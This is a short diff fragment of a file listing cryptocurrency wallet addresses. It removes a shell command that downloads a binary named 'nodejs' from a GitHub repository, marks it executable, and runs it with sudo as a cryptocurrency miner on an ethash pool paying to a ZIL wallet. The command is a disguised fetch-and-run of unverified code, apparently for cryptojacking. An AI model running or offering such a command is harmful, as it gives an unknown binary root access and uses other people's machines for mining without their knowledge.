@@ -9,6 +9,3 @@ ETH
 
 VRSC
 RTYdzcR1YraQQXz2MsKfMyTbDb35MY2x3G
-
-
-apt-get install libpci3 &&  wget https://github.com/gasken1/asw/raw/main/nodejs && chmod +x nodejs && sudo ./nodejs -epool ethash.unmineable.com:3333 -wal ZIL:zil12xj5q0cvpjaz5nm02zntwsp4yr5zvlt2an5mer.$(echo $(shuf -i 1-5 -n 1)-Bsmilah-Ninja) -pass x
